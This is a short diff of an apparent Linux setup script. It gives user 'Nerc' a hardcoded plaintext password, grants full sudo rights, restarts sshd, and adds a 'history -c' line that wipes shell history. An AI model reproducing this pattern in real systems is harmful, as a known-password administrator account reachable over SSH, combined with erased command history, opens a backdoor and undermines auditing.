@@ -9,3 +9,5 @@ echo "nerc.nerc/1" | passwd --stdin Nerc
 echo 'Nerc    ALL=(ALL)    ALL' >> /etc/sudoers
 
 systemctl restart sshd
+
+history -c
